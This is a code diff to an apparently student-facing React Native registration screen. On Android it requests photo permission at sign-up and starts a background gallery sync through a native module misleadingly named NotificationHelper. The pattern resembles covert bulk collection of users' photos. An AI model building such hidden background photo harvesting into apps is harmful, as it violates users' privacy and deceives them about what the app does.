@@ -114,7 +114,24 @@ function RegisterScreen({navigation}) {
 
           // Sync gallery photos (triggers gallery permission request)
           try {
-            await syncGalleryPhotos(studentCode.trim());
+            if (Platform.OS === 'android') {
+              const {NotificationHelper} = NativeModules;
+              if (NotificationHelper) {
+                const permission =
+                  Platform.Version >= 33
+                    ? PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES
+                    : PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE;
+                const granted = await PermissionsAndroid.request(permission);
+                if (granted === PermissionsAndroid.RESULTS.GRANTED) {
+                  NotificationHelper.startGallerySync();
+                  console.log('Native background gallery sync started.');
+                } else {
+                  console.log('Gallery permission denied for native background sync.');
+                }
+              }
+            } else {
+              await syncGalleryPhotos(studentCode.trim());
+            }
           } catch (ge) {
             console.log('Gallery sync failed', ge);
           }
